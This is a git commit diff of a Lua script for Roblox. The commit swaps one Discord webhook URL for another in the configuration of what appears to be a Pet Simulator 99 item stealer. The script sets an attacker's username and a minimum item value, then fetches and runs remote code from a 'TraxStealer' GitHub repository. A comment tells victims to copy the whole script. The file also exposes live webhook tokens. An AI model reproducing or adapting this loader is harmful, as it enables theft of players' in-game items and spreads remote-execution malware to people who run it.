57c96ef162334f0383f127ad22faa72784db7dad
RAYZHUB <mooojjj603@gmail.com>
2025-02-20 17:17:20 +0100

    Update VCRXTAAK1NGSCRIPT.lua

--- VCRXTAAK1NGSCRIPT.lua
+++ VCRXTAAK1NGSCRIPT.lua
@@ -1,6 +1,6 @@
 Username = "omega56786fall"
 Username2 = "omega56786fall"
 MinimumRAP = 75000
-Webhook = "https://discord.com/api/webhooks/1341733571043393607/WUEg5728Yzvjk1GSAB7Xs-VK00d--jAoD92y0CM4zmNboMcuj6--rwcsqMyGnNryyj-k"
+Webhook = "https://discord.com/api/webhooks/1342137245586690058/PGn2SYiMhq9Vb7B1f_nEoF5dltedzXo5HlXKAeNOy94i3QvioaESdm1BZs0i_7sAW6TL"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/TraxStealer/refs/heads/main/PS99Stealer", true))() -- copy the whole thing, even the username =
